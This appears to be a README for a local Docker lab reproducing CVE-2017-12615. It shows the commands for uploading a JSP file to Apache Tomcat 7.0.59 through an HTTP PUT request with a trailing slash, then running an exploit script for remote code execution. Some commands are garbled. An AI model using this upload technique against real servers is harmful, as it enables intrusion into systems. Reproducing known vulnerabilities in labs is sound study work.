# CVE-2017-12615
## Bug Overview
The **Apache Tomcat:7.0.x** is designed such that the **JSP** files are not allowed to be uploaded to the host server’s system via **HTTP PUT** method. The supported file extensions allowed to be uploaded are .html, .xml, .pdf and any other extensions except .jsp, .jspx and its variants. <br>

And moreover the initial configuration of the site is kept such that it does not respond to the **HTTP PUT** and **DELETE** requests method and the permissions to modify the same is not granted by default as you would need the **ROOT** permissions to change the web application at the server side.

## Setting up the docker environment
Set up the docker environment and perform the following command line operations to run the tomcat server with version number 7.0.59 locally on it.
- Use `docker pull tomcat:7.0.59` to pull the tomcat’s defined version on your local storage
- Run `docker run -itd --rm --name webapp -p 8888:8080 tomcat:7.0.59` to start the web hosting detached in the background
- The container number of the disk image can be viewed using the command `docker ps`
- The `docker exec -it <container number> /bin/bash` command is executed with the appropriate container to enter the docker console in which the web app is running
- Once inside perform the modifictaions in the file names mentioned inside `commands.txt`
- Run `catalina.sh run` and `exit` from the system
- Run the `PUT` request through either of the following environments:
    1. POSTMAN: Paste the contents of `postman_raw.txt` inside the body of the PUT request API to direct your request to the local host
    2. Run `curl -X PUT http://localhost:port number/Testing.jsp/ -d @- < exploit.jsp` inside the terminal to direct the request to local host at port 8888

#### The following modifications are availabe to the site at the webaddress `http://localhost:port number/Testing.jsp/` which prints a string onto the web server as well as the system console log

## Running the exploit
- Run python3.py `localhost:portnumber` pwn

#### Hurray!! You have achieved the Remote Code Injection!
